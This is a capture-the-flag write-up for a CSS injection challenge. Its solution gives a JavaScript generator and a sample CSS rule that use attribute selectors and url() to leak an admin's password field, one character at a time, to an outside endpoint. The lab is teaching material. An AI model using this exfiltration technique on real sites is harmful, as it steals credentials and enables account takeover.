# Hacking with Style

## Challenge Overview

Bob the Tomato is a web admin who has set up a new website. While he's great with coding, he isn't as good with styles, so he's looking for community contributions. People can submit CSS to Bob for him to try (read: load into a puppeteer runner). CSS Injection attacks can be used here to get information about the page in Bob's session, when he tests the CSS styles.

## Solution

CSS selectors offer a number of partial matching options, these can be exploited en-masse, along with the url function, to send web requests in response to page contents.

While this can be written by hand, students will find this much easier with a script to write the CSS.

Something like the following would work well:

```js
const url = 'https://some.http.endpoint';
const alphabet = [];
for (let i = 97; i < 123; i++) {
    alphabet.push(String.fromCharCode(i));
}
console.log(alphabet.map(letter=>`#password[value^=${prefix}${letter}] {
    background-image: url('${url}/${prefix}${letter}');
}`).join('\n'));
```

This will then generate CSS like:

```css
#password[value^=t] {
    background-image: url('https://some.http.endpoint/t');
}
```

Which will submit a request to the given endpoint if and only if the #password field (in /account) has a value starting with "t".

By brute-forcing one letter at a time, the students can work out Bob's password, log into his account, and find the flag.

## Hints

See `/hint`
